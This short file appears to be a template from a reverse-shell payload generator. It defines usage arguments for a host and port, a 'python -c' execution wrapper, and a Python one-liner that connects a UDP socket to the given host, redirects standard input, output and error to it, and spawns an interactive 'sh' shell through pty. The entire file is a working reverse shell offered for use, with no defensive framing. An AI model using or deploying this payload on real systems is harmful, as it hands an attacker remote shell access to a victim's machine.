USAGE = 'host port'
NARGS = [2, 2]
LANG = 'py'
EXEC = '''
python -c "PAYLOAD"
'''

pl = '''
import pty,os,socket;VAR0=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);VAR0.connect(('ARG1',ARG2));[os.dup2(VAR0.fileno(),i) for i in [0,1,2]];pty.spawn('sh')
'''
